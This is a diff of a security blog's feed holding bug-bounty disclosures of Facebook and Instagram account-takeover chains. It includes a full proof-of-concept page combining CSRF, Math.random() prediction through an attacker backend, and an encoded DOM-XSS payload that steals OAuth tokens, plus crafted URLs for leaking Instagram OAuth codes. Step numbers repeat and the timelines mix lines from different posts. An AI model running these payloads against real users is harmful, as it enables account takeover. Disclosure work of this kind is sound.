+<p>4) Attacker performs a Logout CSRF</p>
+
+<p>5) Attacker performs a Login CSRF into his account</p>
+
+<p>4) Attacker creates another iframe, and loads the Facebook page with customer chat plugin:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://secure.facebook.com/business/goals/add-live-chat-to-website-with-messenger?
+<span class="err">&amp;</span>cquick=1
+<span class="err">&amp;</span>cquick_token=ATTACKE_TOKEN
+<span class="err">&amp;</span>ctarget=https://www.facebook.com
+</code></pre></div></div>
+
+<p>5) Attacker redirects <code class="language-plaintext highlighter-rouge">window.frames[1].frames[0]</code> ( containing the plugin script ) to attacker website</p>
+
+<p>6) Attacker saves <code class="language-plaintext highlighter-rouge">window.frames[1].frames[0].name</code></p>
+
+<p>7) Attacker force reinitialization via <code class="language-plaintext highlighter-rouge">init:post</code></p>
+
+<p>8) Attacker repeats steps <code class="language-plaintext highlighter-rouge">5</code>, <code class="language-plaintext highlighter-rouge">6</code> and <code class="language-plaintext highlighter-rouge">7</code> until he gets at least 4 values</p>
+
+<p>9) Attacker sends <code class="language-plaintext highlighter-rouge">Math.random()</code> values to the backend, and gets the next values</p>
+
+<p>10) Attacker force reinitialization via <code class="language-plaintext highlighter-rouge">init:post</code></p>
+
+<p>11) Attacker sends payload message to <code class="language-plaintext highlighter-rouge">window.frames[1]</code> from <code class="language-plaintext highlighter-rouge">facebook.com</code> with the correct callback identifier, using trick in <code class="language-plaintext highlighter-rouge">I</code></p>
+
+<p>12) DOM-XSS achieved in <code class="language-plaintext highlighter-rouge">www.facebook.com</code>, the script would access same-origin iframe <code class="language-plaintext highlighter-rouge">[ name:MAIN ]</code> via <code class="language-plaintext highlighter-rouge">top.frames[0]</code> and reads victim OAuth token</p>
+
+<h2 id="proof-of-concept">Proof of concept</h2>
+<hr />
+<p><br /></p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+    <span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;/head&gt;</span>
+    <span class="nt">&lt;body&gt;</span>
+
+        <span class="nt">&lt;iframe</span> <span class="na">width=</span><span class="s">"1"</span> <span class="na">height=</span><span class="s">"1"</span> <span class="na">name=</span><span class="s">"oauth"</span> <span class="na">src=</span><span class="s">"https://www.facebook.com/dialog/oauth..."</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+        <span class="nt">&lt;iframe</span> <span class="na">style=</span><span class="s">"position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"</span> <span class="na">id=</span><span class="s">"theframe"</span> <span class="na">name=</span><span class="s">"ddoc"</span> <span class="na">src=</span><span class="s">""</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+        <span class="nt">&lt;iframe</span> <span class="na">width=</span><span class="s">"1"</span> <span class="na">height=</span><span class="s">"1"</span> <span class="na">name=</span><span class="s">"reload"</span> <span class="na">src=</span><span class="s">""</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+
+        <span class="nt">&lt;script&gt;</span>
+        
+        <span class="nx">cquick_token</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">ATTACKER_COMPAT_TOKEN</span><span class="dl">"</span><span class="p">;</span>
+        <span class="nx">BACKEND_URL</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">ATTACKER_WEBSITE_SOLVER</span><span class="dl">"</span><span class="p">;</span>
+        <span class="nx">list_math_random</span><span class="o">=</span> <span class="p">{};</span>
+
+        <span class="cm">/* ==================== STEP 0 ==================== */</span>
+
+        <span class="cm">/* Logout / Login CSRF */</span>
+        
+        <span class="cm">/* ==================== STEP 1 ==================== */</span>
+
+        <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+
+          <span class="c1">// Setup a message listener to collect Math.random() values from plugin iframe</span>
+
+          <span class="nb">window</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+            <span class="k">if</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">code</span> <span class="o">&amp;&amp;</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">num</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">xx</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">num</span><span class="p">;</span>
+                <span class="nx">value</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
+                <span class="nx">value</span> <span class="o">=</span> <span class="nf">toRandom</span><span class="p">(</span><span class="nx">value</span><span class="p">);</span>
+                <span class="nx">list_math_random</span><span class="p">[</span><span class="nx">xx</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+          <span class="c1">// Load the Facebook iframe to start the process</span>
+          <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">theframe</span><span class="dl">"</span><span class="p">).</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://secure.facebook.com/business/goals/add-live-chat-to-website-with-messenger?wtsid=rdr_0JnaCVB7Xiu2W3gl6&amp;cquick=1&amp;cquick_token=</span><span class="dl">"</span><span class="o">+</span> 
+          <span class="nx">cquick_token</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;ctarget=https://www.facebook.com</span><span class="dl">"</span><span class="p">;</span>
+          
+          <span class="nx">xf</span> <span class="o">=</span> <span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+                    <span class="nx">target_frame</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">reload</span><span class="dl">"</span><span class="p">).</span><span class="nx">contentWindow</span>
+                    <span class="nf">sendMessageFromFacebookOrigin</span><span class="p">(</span><span class="dl">'</span><span class="s1">&amp;xd_action=dd&amp;data=FB_RPC:{"method":"fireEvent","params":["init:post",{"xfbml":1}]}</span><span class="dl">'</span><span class="p">,</span> <span class="nx">reload</span><span class="p">);</span>
+                    <span class="nx">interv</span> <span class="o">=</span> <span class="nf">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+                        <span class="k">try</span><span class="p">{</span>
+                                <span class="c1">// Detect when the iframes are loaded</span>
+                                <span class="nb">window</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">frames</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">postMessage</span><span class="p">(</span><span class="dl">"</span><span class="s2">testing</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">);</span>
+                                <span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">frames</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+                                    <span class="c1">// Load a data URL that sends the frame's name back to the parent</span>
+                                    <span class="nx">ff</span> <span class="o">=</span> <span class="dl">'</span><span class="se">\</span><span class="s1">x3chtml&gt;</span><span class="se">\</span><span class="s1">x3cbody&gt;</span><span class="se">\</span><span class="s1">x3cscript&gt;f={"code":1,"num":</span><span class="dl">'</span><span class="o">+</span><span class="nx">i</span><span class="o">+</span><span class="dl">'</span><span class="s1">,"data":window.name};top.postMessage(f,"*")</span><span class="se">\</span><span class="s1">x3c/script&gt;</span><span class="se">\</span><span class="s1">x3c/body&gt;</span><span class="se">\</span><span class="s1">x3c/html&gt;</span><span class="dl">'</span><span class="p">;</span>
+                                    <span class="nx">ff</span> <span class="o">=</span> <span class="nf">btoa</span><span class="p">(</span><span class="nx">ff</span><span class="p">);</span>
+                                    <span class="nb">window</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nx">i</span><span class="p">].</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">data:text/html;base64,</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">ff</span><span class="p">;</span>
+                                <span class="p">}</span>
+                                <span class="nf">clearInterval</span><span class="p">(</span><span class="nx">interv</span><span class="p">);</span>
+                        <span class="p">}</span>
+                        <span class="k">catch</span><span class="p">{}</span>
+                    
+                    <span class="p">},</span> <span class="mi">1000</span> <span class="p">);</span>
+                
+          <span class="p">},</span> <span class="mi">20000</span> <span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="cm">/* ==================== STEP 2 ==================== */</span>
+
+        <span class="c1">// Check if the list of Math.random() values is complete</span>
+        <span class="nx">listcheck</span> <span class="o">=</span> <span class="nf">setInterval</span><span class="p">(()</span><span class="o">=&gt;</span><span class="p">{</span>
+            <span class="k">if</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nf">keys</span><span class="p">(</span><span class="nx">list_math_random</span><span class="p">).</span><span class="nx">length</span> <span class="o">&gt;</span><span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nf">clearInterval</span><span class="p">(</span><span class="nx">listcheck</span><span class="p">);</span>
+                <span class="nf">setTimeout</span><span class="p">(()</span><span class="o">=&gt;</span><span class="p">{</span>
+                    <span class="nx">l</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">values</span><span class="p">(</span><span class="nx">list_math_random</span><span class="p">);</span>
+
+                    <span class="c1">// Try to xss with different combinations until we get valid values from the server ( Z3 Solver can hang sometimes )</span>
+                    <span class="nf">start_xss</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">));</span>
+                    <span class="nf">start_xss</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">));</span>
+                    <span class="nf">start_xss</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">7</span><span class="p">));</span>
+                    <span class="nf">start_xss</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">8</span><span class="p">));</span>
+                    <span class="nf">start_xss</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mi">9</span><span class="p">));</span>
+                    <span class="nf">start_xss</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">10</span><span class="p">));</span>
+                    <span class="nf">start_xss</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">11</span><span class="p">));</span>
+                    
+                <span class="p">},</span><span class="mi">3000</span><span class="p">);</span>
+            
+                    
+                <span class="p">}</span>
+        <span class="p">},</span><span class="mi">2000</span><span class="p">);</span>
+          
+        <span class="cm">/* ==================== STEP 3 ==================== */</span>
+
+        <span class="kd">function</span> <span class="nf">start_xss</span><span class="p">(</span><span class="nx">values_array</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nx">str</span> <span class="o">=</span> <span class="nx">values_array</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="dl">"</span><span class="s2">,</span><span class="dl">"</span><span class="p">);</span>
+            <span class="kd">const</span> <span class="nx">controller</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">AbortController</span><span class="p">()</span>
+            <span class="kd">const</span> <span class="nx">timeoutId</span> <span class="o">=</span> <span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="nx">controller</span><span class="p">.</span><span class="nf">abort</span><span class="p">()},</span> <span class="mi">5000</span><span class="p">)</span>
+            
+            <span class="c1">// Sends values to backend</span>
+            <span class="nf">fetch</span><span class="p">(</span><span class="nx">BACKEND_URL</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">?id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">str</span><span class="p">,{</span> <span class="na">signal</span><span class="p">:</span> <span class="nx">controller</span><span class="p">.</span><span class="nx">signal</span> <span class="p">}).</span><span class="nf">then</span><span class="p">(</span><span class="nx">response</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nf">json</span><span class="p">())</span>
+                   <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">response</span> <span class="o">=&gt;</span> <span class="p">{</span>
+                       <span class="k">if</span><span class="p">(</span><span class="nx">response</span><span class="p">[</span><span class="dl">'</span><span class="s1">data</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">result</span><span class="dl">'</span><span class="p">]</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">error</span><span class="dl">"</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
+                       <span class="nx">data</span> <span class="o">=</span> <span class="nx">response</span><span class="p">[</span><span class="dl">'</span><span class="s1">data</span><span class="dl">'</span><span class="p">];</span>
+                       <span class="nx">data</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">,</span><span class="dl">"</span><span class="p">);</span>
+                       <span class="nx">tests</span> <span class="o">=</span> <span class="nf">setInterval</span><span class="p">(()</span><span class="o">=&gt;</span><span class="p">{</span>
+                        <span class="k">if</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                           <span class="nf">clearInterval</span><span class="p">(</span><span class="nx">tests</span><span class="p">);</span>
+                        <span class="p">}</span>
+                        <span class="c1">// we have a match let's try sending the message</span>
+                        <span class="nx">callbacks</span> <span class="o">=</span> <span class="nf">guid</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nf">shift</span><span class="p">());</span>
+                        
+                        <span class="c1">// payload : &amp;lt;img src=x onerror='parent.postMessage("body:" + parent.frames[0].document.body.innerHTML,"*")'/&amp;gt;</span>
+                        <span class="nx">xss_payload</span> <span class="o">=</span> <span class="nx">callbacks</span><span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;type=mpn.setupIconIframe&amp;frameName=test&amp;iconSVG=%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%27%70%61%72%65%6e%74%2e%70%6f%73%74%4d%65%73%73%61%67%65%28%22%62%6f%64%79%3a%22%20%2b%20%70%61%72%65%6e%74%2e%66%72%61%6d%65%73%5b%30%5d%2e%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%69%6e%6e%65%72%48%54%4d%4c%2c%22%2a%22%29%27%2f%3e&amp;unreadCountCssText={}&amp;cssText={}&amp;availabilityStatusCssText={}&amp;greetingCssText={}</span><span class="dl">"</span><span class="p">;</span>
+
+                        <span class="nx">target_frame</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">frames</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+                        <span class="nf">sendMessageFromFacebookOrigin</span><span class="p">(</span><span class="nx">xss_payload</span><span class="p">,</span> <span class="nx">target_frame</span><span class="p">)</span>
+
+
+                        <span class="c1">// Receive OAuth token</span>
+                        <span class="nx">onmessage</span><span class="o">=</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
+                            <span class="k">if</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">body:</span><span class="dl">"</span><span class="p">)){</span>
+                                <span class="nf">clearInterval</span><span class="p">(</span><span class="nx">tests</span><span class="p">);</span>
+                                <span class="nf">alert</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
+                            <span class="p">}</span>
+                        <span class="p">}</span>
+                    <span class="p">},</span><span class="mi">7000</span><span class="p">);</span>
+                   <span class="p">});</span>
+    
+        <span class="p">}</span>
+
+        <span class="cm">/* ==================== Functions ==================== */</span>
+
+        <span class="kd">function</span> <span class="nf">toRandom</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">flt</span> <span class="o">=</span> <span class="nf">parseFloat2</span><span class="p">(</span><span class="nx">str</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
+            <span class="nx">fin</span> <span class="o">=</span> <span class="nx">flt</span> <span class="o">/</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">30</span><span class="p">);</span>
+            <span class="k">if </span><span class="p">(</span><span class="nx">fin</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">flt</span> <span class="o">=</span> <span class="nf">parseFloat2</span><span class="p">(</span><span class="nx">str</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="k">return</span> <span class="nx">flt</span> <span class="o">/</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">30</span><span class="p">);</span>
+            
+        <span class="p">}</span>
+        <span class="kd">function</span> <span class="nf">sendMessageFromFacebookOrigin</span><span class="p">(</span><span class="nx">msg</span><span class="p">,</span><span class="nx">ifrm</span><span class="p">){</span>
+            <span class="nx">target</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://secure.facebook.com</span><span class="dl">"</span><span class="p">;</span>
+            <span class="nx">ifrm</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">`https://www.facebook.com/plugins/feedback.php?api_key&amp;channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=</span><span class="p">${</span><span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">msg</span><span class="p">)}</span><span class="s2">%26origin=</span><span class="p">${</span><span class="nx">target</span><span class="p">}</span><span class="s2">&amp;href=https%3A%2F%2Fwww.facebook.com%2Fbusiness%2Fnews%2F100-in-view-impressions-and-moat-partnership&amp;locale=en_US&amp;numposts=10&amp;order_by=time&amp;sdk=joey&amp;version=v2.3&amp;width=600&amp;_rdr`</span><span class="p">;</span>
+            
+        <span class="p">}</span>
+
+        <span class="kd">function</span> <span class="nf">parseFloat2</span><span class="p">(</span><span class="nx">str</span><span class="p">,</span> <span class="nx">cof</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nx">str</span> <span class="o">=</span> <span class="nx">str</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+            <span class="nx">str</span> <span class="o">=</span> <span class="nx">str</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nx">cof</span><span class="p">)</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">.</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">str</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="nx">cof</span><span class="p">);</span>
+            <span class="kd">var</span> <span class="nx">parts</span> <span class="o">=</span> <span class="nx">str</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">.</span><span class="dl">"</span><span class="p">);</span>
+            <span class="k">if </span><span class="p">(</span> <span class="nx">parts</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="p">)</span>
+            <span class="p">{</span>
+                <span class="k">return</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">/</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">pow</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="nx">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">length</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="k">return</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">);</span>
+        <span class="p">}</span>
+        
+        <span class="kd">function</span> <span class="nf">guid</span><span class="p">(</span><span class="nx">anystring</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="k">return</span> <span class="dl">"</span><span class="s2">f</span><span class="dl">"</span> <span class="o">+</span> <span class="p">(</span><span class="nx">anystring</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">30</span><span class="p">)).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">.</span><span class="dl">"</span><span class="p">,</span> <span class="dl">""</span><span class="p">)</span>
+                    <span class="p">}</span>
+
+
+        <span class="nt">&lt;/script&gt;</span>
+    <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+
+</code></pre></div></div>
 
 <h1 id="impact">Impact</h1>
 <hr />
 <p><br />
-This vulnerability enables linking attacker-controlled accounts, bypassing Accounts Center confirmations, and achieving full account takeover with minimal interaction.</p>
+This vulnerability enables account takeover of Facebook account if the user visits a link inside Facebook Application in mobile.</p>
 
 <h2 id="timeline">Timeline</h2>
 <hr />
 <p><br />
-Jun 27, 2023 — Bug reported</p>
+Jun 22, 2023 — Bug reported</p>
 
-<p>Jun 28, 2023 — Bug Acknowledged by Meta</p>
+<p>Jun 23, 2023 — Bug Acknowledged by Meta</p>
 
-<p>Jun 29, 2023 — <strong>$32,500</strong> bounty awarded by Meta</p>
+<p>Jun 28, 2023 — <strong>$66,000</strong> bounty awarded by Meta</p>
 
-<p>Dec 29, 2024 Bypass repoted</p>
+<p>Dec 15, 2023 — Bug fixed by Meta</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Facebook Javascript SDK and Facebook plugins]]></summary></entry><entry><title type="html">Instagram account takeover via Meta Pixel script abuse</title><link href="http://localhost:4000/uncategorized/2026/01/16/leaking-fbevents-ato.html" rel="alternate" type="text/html" title="Instagram account takeover via Meta Pixel script abuse" /><published>2026-01-16T00:00:00+02:00</published><updated>2026-01-16T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/16/leaking-fbevents-ato</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/16/leaking-fbevents-ato.html"><![CDATA[<h1 id="introduction">Introduction</h1>
+<hr />
+<p><br />
+Meta’s web ecosystem relies on cross-window messaging between first-party websites.
+In many cases, the only security control enforced is an origin check validating that messages originate from <code class="language-plaintext highlighter-rouge">facebook.com</code> or its subdomains.</p>
 
-<p>Apr 28, 2025 — <strong>$32,500</strong> bounty awarded by Meta</p>
+<p>This write-up describes how that assumption can be abused to steal first-party OAuth codes and generate first-party Instagram access tokens, ultimately enabling Instagram and Facebook account takeovers under realistic conditions.</p>
 
-<p>Jan 15, 2026 — Bug fixed by Meta</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction FXAuth is Meta’s shared authentication system used across Facebook, Instagram, and Meta (Horizon / VR). It is used by Accounts Center for account linking, re-authentication, and sensitive action confirmation.]]></summary></entry><entry><title type="html">Multiple cross-site leaks disclosing Facebook users in third-party websites</title><link href="http://localhost:4000/uncategorized/2026/01/16/cross-site-leaks.html" rel="alternate" type="text/html" title="Multiple cross-site leaks disclosing Facebook users in third-party websites" /><published>2026-01-16T00:00:00+02:00</published><updated>2026-01-16T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/16/cross-site-leaks</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/16/cross-site-leaks.html"><![CDATA[<h1 id="introduction">Introduction</h1>
+<p>The attack leverages a chain between a misconfigured Facebook endpoint and implicit trust in postMessage listeners such as in <code class="language-plaintext highlighter-rouge">fbevents.js</code>, which is widely deployed across Meta-owned and third-party websites.</p>
+
+<h1 id="description">Description</h1>
+<hr />
+<h3 id="cross-window-trust-in-meta-javascript">Cross-Window Trust in Meta JavaScript</h3>
+
+<p>Multiple Meta JavaScript modules register cross-window message listeners and trust incoming messages solely based on <code class="language-plaintext highlighter-rouge">event.origin</code> being <code class="language-plaintext highlighter-rouge">facebook.com</code> or one of its subdomains.</p>
+
+<p>One such consumer is <code class="language-plaintext highlighter-rouge">fbevents.js</code>, the Meta Pixel script embedded on millions of websites.
+When loaded in a window that has an <code class="language-plaintext highlighter-rouge">opener</code>, <code class="language-plaintext highlighter-rouge">fbevents.js</code> registers a message listener and reacts to specific message types by issuing requests to <code class="language-plaintext highlighter-rouge">graph.facebook.com</code>, including contextual data such as the current website’s <code class="language-plaintext highlighter-rouge">location.href</code> and <code class="language-plaintext highlighter-rouge">document.referrer</code>. These values would contain sensitive artifacts such as OAuth authorization codes or stokens.</p>
+
+<h3 id="abusing-facebookcomredacted-endpoint">Abusing facebook.com/REDACTED endpoint</h3>
+
+<p>The message source in this chain is the endpoint <code class="language-plaintext highlighter-rouge">https://www.facebook.com/REDACTED</code></p>
+
+<p>This endpoint constructs an object from user-supplied parameters and forwards it via <code class="language-plaintext highlighter-rouge">postMessage</code> to a target Facebook domain specified by the attacker.</p>
+
+<h3 id="chaining-with-fbeventsjs">Chaining with fbevents.js</h3>
+
+<p>When <code class="language-plaintext highlighter-rouge">fbevents.js</code> receives a message originating from <code class="language-plaintext highlighter-rouge">facebook.com</code> and matching specific message types, it uses the supplied <code class="language-plaintext highlighter-rouge">access_token</code> in the message to issue requests to <code class="language-plaintext highlighter-rouge">graph.facebook.com</code>.</p>
+
+<p>Crucially, the attacker fully controls this <code class="language-plaintext highlighter-rouge">access_token</code>. Meaning by supplying an attacker-owned Graph Explorer token, the resulting requests can later be inspected in the Graph Explorer history, where leaked values such as the victim’s OAuth code/token in the URL or <code class="language-plaintext highlighter-rouge">referrer</code> become visible.</p>
+
+<h3 id="attack-scenario">Attack Scenario</h3>
+
+<p>The following scenario targets <code class="language-plaintext highlighter-rouge">developers.facebook.com</code>, which loads <code class="language-plaintext highlighter-rouge">fbevents.js</code> and hosts multiple OAuth callback endpoints for Instagram and Threads.</p>
+
+<p>An example OAuth authorization request initiated by the attacker:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.instagram.com/oauth/authorize/third_party?
+<span class="err">&amp;</span>app_id=200289238967899
+<span class="err">&amp;</span>redirect_uri=https://developers.facebook.com/instagram/token_generator/oauth/
+<span class="err">&amp;</span>response_type=code
+<span class="err">&amp;</span>scope=user_profile,user_media
+<span class="err">&amp;</span>state={"app_id":"200289238967899","nonce":"WRONG_NONCE","user_id":"1"}
+</code></pre></div></div>
+<p>Using an invalid nonce causes the flow to land on an error page at <code class="language-plaintext highlighter-rouge">developers.facebook.com</code>, which still loads <code class="language-plaintext highlighter-rouge">fbevents.js</code>.</p>
+
+<p>Because the window has an opener, <code class="language-plaintext highlighter-rouge">fbevents.js</code> initializes its message listener.</p>
+
+<p>At this point, the attacker redirects attacker website to:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.facebook.com/REDACTED/?
+<span class="err">&amp;</span>graphToken=ATTACKER_EXPLORER_TOKEN
+<span class="err">&amp;</span>msg_type=FACEBOOK_IWL_BOOTSTRAP
+<span class="err">&amp;</span>pixelID=438056466377696
+<span class="err">&amp;</span>sessionStartTime=1668626372000
+</code></pre></div></div>
+
+<p>This causes <code class="language-plaintext highlighter-rouge">www.facebook.com</code> to send a crafted message to the <code class="language-plaintext highlighter-rouge">opener</code> (developers.facebook.com) window under a trusted origin. <code class="language-plaintext highlighter-rouge">fbevents.js</code> consumes the message and issues Graph API requests using the attacker-controlled token, embedding <code class="language-plaintext highlighter-rouge">location.href</code> and <code class="language-plaintext highlighter-rouge">document.referrer</code> in these requests.</p>
+
+<p>By inspecting the attacker token’s history in Graph Explorer, the attacker can retrieve the Instagram OAuth authorization code and referrer data.</p>
+
+<h3 id="generating-a-first-party-instagram-access-token">Generating a First-Party Instagram Access Token</h3>
+
+<p>The stolen code can be exchanged for a first-party Instagram access token by abusing the following endpoint:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://developers.facebook.com/instagram/short_lived_access_token/oauth/?
+<span class="err">&amp;</span>code=VICTIM_CODE
+<span class="err">&amp;</span>state={"app_id":"FIRST_PARTY_APP","nonce":"YOUR_NONCE","user_id":"1"}
+</code></pre></div></div>
+
